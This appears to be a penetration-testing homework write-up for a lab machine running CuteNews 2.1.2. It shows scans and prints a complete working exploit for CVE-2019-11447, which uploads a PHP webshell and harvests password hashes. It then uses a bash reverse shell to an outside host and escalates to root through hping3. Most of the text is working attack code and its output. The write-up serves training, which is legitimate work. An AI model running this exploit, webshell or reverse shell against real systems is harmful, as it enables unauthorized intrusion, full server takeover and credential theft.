
# Phase_2_homework_1

172.16.33.9
172.16.33.13
172.16.33.18
172.16.33.21
172.16.33.25
172.16.33.29

## 172.16.33.9 - BBS (CUTE): 1.0.2

### reference

<https://0xv1n.github.io/posts/bbscute/>

### namp

```bash
└─$ nmap -sV -sC -A -p- -o ./nmap/sr 172.16.33.9

Starting Nmap 7.93 ( https://nmap.org ) at 2024-01-31 11:34 CST
Nmap scan report for 172.16.33.9
Host is up (0.068s latency).
Not shown: 65530 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 04d06ec4ba4a315a6fb3eeb81bed5ab7 (RSA)
|   256 24b3df010bcac2ab2ee949b058086afa (ECDSA)
|_  256 6ac4356a7a1e7e51855b815c7c744984 (ED25519)
80/tcp  open  http     Apache httpd 2.4.38 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.38 (Debian)
88/tcp  open  http     nginx 1.14.2htt
|_http-title: 404 Not Found
|_http-server-header: nginx/1.14.2
110/tcp open  pop3     Courier pop3d
|_pop3-capabilities: STLS IMPLEMENTATION(Courier Mail Server) PIPELINING UIDL LOGIN-DELAY(10) UTF8(USER) USER TOP
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
995/tcp open  ssl/pop3 Courier pop3d
|_pop3-capabilities: UIDL PIPELINING IMPLEMENTATION(Courier Mail Server) LOGIN-DELAY(10) UTF8(USER) USER TOP
| ssl-cert: Subject: commonName=localhost/organizationName=Courier Mail Server/stateOrProvinceName=NY/countryName=US
| Subject Alternative Name: email:postmaster@example.com
| Not valid before: 2020-09-17T16:28:06
|_Not valid after:  2021-09-17T16:28:06
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 48.44 seconds
```

### gobuster

```bash
└─$ gobuster dir -u http://172.16.33.9 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.33.9
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/core                 (Status: 301) [Size: 309] [--> http://172.16.33.9/core/]
/docs                 (Status: 301) [Size: 309] [--> http://172.16.33.9/docs/]
/favicon.ico          (Status: 200) [Size: 1150]
/index.html           (Status: 200) [Size: 10701]
/index.php            (Status: 200) [Size: 6175]
/libs                 (Status: 301) [Size: 309] [--> http://172.16.33.9/libs/]
/manual               (Status: 301) [Size: 311] [--> http://172.16.33.9/manual/]
/server-status        (Status: 403) [Size: 276]
/skins                (Status: 301) [Size: 310] [--> http://172.16.33.9/skins/]
/uploads              (Status: 301) [Size: 312] [--> http://172.16.33.9/uploads/]
Progress: 4614 / 4615 (99.98%)
===============================================================
Finished
===============================================================
```

### searchsploit

```bash
└─$ searchsploit cutenews | grep 2.1
CuteNews 1.4.0 - Shell Injection / Remote Command Execution                                                                                   | php/webapps/1221.php
CuteNews 1.4.5 - 'rss_title' Cross-Site Scripting                                                                                             | php/webapps/29159.txt
CuteNews 1.4.5 - 'show_news.php' Cross-Site Scripting                                                                                         | php/webapps/29158.txt
CuteNews 2.1.2 - 'avatar' Remote Code Execution (Metasploit)                                                                                  | php/remote/46698.rb
CuteNews 2.1.2 - Arbitrary File Deletion                                                                                                      | php/webapps/48447.txt
CuteNews 2.1.2 - Authenticated Arbitrary File Upload                                                                                          | php/webapps/48458.txt
CuteNews 2.1.2 - Remote Code Execution                                                                                                        | php/webapps/48800.py
CutePHP CuteNews 1.3.6 - 'x-forwarded-for' Script Injection                                                                                   | php/webapps/25177.txt

└─$ searchsploit -m 48800           
  Exploit: CuteNews 2.1.2 - Remote Code Execution
      URL: https://www.exploit-db.com/exploits/48800
     Path: /usr/share/exploitdb/exploits/php/webapps/48800.py
    Codes: CVE-2019-11447
 Verified: True
File Type: Python script, ASCII text executable
Copied to: /home/parallels/OSCP/Phase_2/homework/1/48800.py
```

#### CVE-2019-11447

```python
# Exploit Title: CuteNews 2.1.2 - Remote Code Execution
# Google Dork: N/A
# Date: 2020-09-10
# Exploit Author: Musyoka Ian
# Vendor Homepage: https://cutephp.com/cutenews/downloading.php
# Software Link: https://cutephp.com/cutenews/downloading.php
# Version: CuteNews 2.1.2
# Tested on: Ubuntu 20.04, CuteNews 2.1.2
# CVE : CVE-2019-11447

#! /bin/env python3

import requests
from base64 import b64decode
import io
import re
import string
import random
import sys


banner = """


           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/



"""
print (banner)
print ("[->] Usage python3 expoit.py")
print ()
sess = requests.session()
payload = "GIF8;\n<?php system($_REQUEST['cmd']) ?>"
# ip = input("Enter the URL> ")
ip = sys.argv[1]
def extract_credentials():
    global sess, ip
    url = f"{ip}/cdata/users/lines"
    encoded_creds = sess.get(url).text
    buff = io.StringIO(encoded_creds)
    chash = buff.readlines()
    if "Not Found" in encoded_creds:
            print ("[-] No hashes were found skipping!!!")
            return
    else:
        for line in chash:
            if "<?php die('Direct call - access denied'); ?>" not in line:
                credentials = b64decode(line)
                try:
                    sha_hash = re.search('"pass";s:64:"(.*?)"', credentials.decode()).group(1)
                    print (sha_hash)
                except:
                    pass
def register():
    global sess, ip
    userpass = "".join(random.SystemRandom().choice(string.ascii_letters + string.digits ) for _ in range(10))
    postdata = {
        "action" : "register",
        "regusername" : userpass,
        "regnickname" : userpass,
        "regpassword" : userpass,
        "confirm" : userpass,
        "regemail" : f"{userpass}@hack.me"
    }
    register = sess.post(f"{ip}/index.php?register", data = postdata, allow_redirects = False)
    if 302 == register.status_code:
        print (f"[+] Registration successful with username: {userpass} and password: {userpass}")
    else:
        sys.exit()
def send_payload(payload):
    global ip
    token = sess.get(f"{ip}/index.php?mod=main&opt=personal").text
    signature_key = re.search('signature_key" value="(.*?)"', token).group(1)
    signature_dsi = re.search('signature_dsi" value="(.*?)"', token).group(1)
    logged_user = re.search('disabled="disabled" value="(.*?)"', token).group(1)
    print (f"signature_key: {signature_key}")
    print (f"signature_dsi: {signature_dsi}")
    print (f"logged in user: {logged_user}")

    files = {
        "mod" : (None, "main"),
        "opt" : (None, "personal"),
        "__signature_key" : (None, f"{signature_key}"),
        "__signature_dsi" : (None, f"{signature_dsi}"),
        "editpassword" : (None, ""),
        "confirmpassword" : (None, ""),
        "editnickname" : (None, logged_user),
        "avatar_file" : (f"{logged_user}.php", payload),
        "more[site]" : (None, ""),
        "more[about]" : (None, "")
    }
    payload_send = sess.post(f"{ip}/index.php", files = files).text
    print("============================\nDropping to a SHELL\n============================")
    while True:
        print ()
        command = input("command > ")
        postdata = {"cmd" : command}
        output = sess.post(f"{ip}/uploads/avatar_{logged_user}_{logged_user}.php", data=postdata)
        if 404 == output.status_code:
            print ("sorry i can't find your webshell try running the exploit again")
            sys.exit()
        else:
            output = re.sub("GIF8;", "", output.text)
            print (output.strip())

if __name__ == "__main__":
    print ("================================================================\nUsers SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN\n================================================================")
    extract_credentials()
    print ("================================================================")
    print()
    print ("=============================\nRegistering a users\n=============================")
    register()
    print()
    print("=======================================================\nSending Payload\n=======================================================")
    send_payload(payload)
    print ()
```

### priviledge escalation

#### client reverse shell

```bash
└─$ python a.py http://172.16.33.9



           _____     __      _  __                     ___   ___  ___
          / ___/_ __/ /____ / |/ /__ _    _____       |_  | <  / |_  |
         / /__/ // / __/ -_)    / -_) |/|/ (_-<      / __/_ / / / __/
         \___/\_,_/\__/\__/_/|_/\__/|__,__/___/     /____(_)_(_)____/
                                ___  _________
                               / _ \/ ___/ __/
                              / , _/ /__/ _/
                             /_/|_|\___/___/




[->] Usage python3 expoit.py

================================================================
Users SHA-256 HASHES TRY CRACKING THEM WITH HASHCAT OR JOHN
================================================================
[-] No hashes were found skipping!!!
================================================================

=============================
Registering a users
=============================
[+] Registration successful with username: qjwGjty618 and password: qjwGjty618

=======================================================
Sending Payload
=======================================================
signature_key: bd870272be251d881a8c95ae5c0e039f-qjwGjty618
signature_dsi: 86064eb1c761dd27ac897052ed71a8f8
logged in user: qjwGjty618
============================
Dropping to a SHELL
============================

command > ls      
avatar_eQdXfxiH1G_eQdXfxiH1G.php
avatar_qjwGjty618_qjwGjty618.php
avatar_w02Pd1nKDU_w02Pd1nKDU.php
index.html
sudo

command > pwd
/var/www/html/uploads

command > whoami        
www-data

command > id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

command > bash -c 'bash -i >& /dev/tcp/10.8.0.153/6666 0>&1'
```

#### server

```bash
└─$ nc -lvvp 6666
listening on [any] 6666 ...
172.16.33.9: inverse host lookup failed: Unknown host
connect to [10.8.0.153] from (UNKNOWN) [172.16.33.9] 59176
bash: cannot set terminal process group (536): Inappropriate ioctl for device
bash: no job control in this shell
www-data@cute:/var/www/html/uploads$ python -c 'import pty;pty.spawn("/bin/bash")'
<oads$ python -c 'import pty;pty.spawn("/bin/bash")'
www-data@cute:/var/www/html/uploads$ whoami
whoami
www-data
www-data@cute:/var/www/html/uploads$ /usr/sbin/hping3
/usr/sbin/hping3
hping3> whoami
whoami
root
hping3> ls /root
ls /root
:wq  localweb  root.txt
hping3> cat /root/root.txt
cat /root/root.txt
0b18032c2d06d9e738ede9bc24795ff2
hping3>
```
